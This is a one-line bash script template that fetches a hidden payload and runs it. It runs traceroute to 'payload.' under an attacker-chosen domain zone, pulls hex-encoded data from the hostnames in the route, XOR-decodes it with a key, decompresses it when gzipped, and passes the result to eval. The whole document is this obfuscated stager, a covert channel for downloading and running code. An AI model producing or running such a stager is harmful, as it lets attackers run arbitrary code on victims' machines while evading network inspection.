z={{DOMAIN_ZONE}};t=$(traceroute payload.$z 2>&1);k=({{KEY_SPACE}});h=$(echo "$t"|grep -oE '\S+\.\S+\.\S+\.\S+(\.\S+)*'|while IFS= read -r host; do [ "${host%%.*}" = "end" ] && break; echo "$host"|tr '.' '\n'|grep -E '^[0-9a-fA-F]+$'|while read -r lbl; do [ $((${#lbl}%2)) -eq 0 ] && printf "%s" "$lbl"; done; done);[ -n "$h" ]&&{ i=0;while [ $i -lt ${#h} ];do v=$((16#${h:$i:2}));printf "\\x$(printf '%02x' $((v^k[i/2%4])))";((i+=2));done > /tmp/tt.$$;if [ "$(head -c 3 /tmp/tt.$$|xxd -p|tr -d '\n')" = "1f8b08" ];then eval "$(gzip -dc /tmp/tt.$$)";else eval "$(cat /tmp/tt.$$)";fi;rm -f /tmp/tt.$$; }
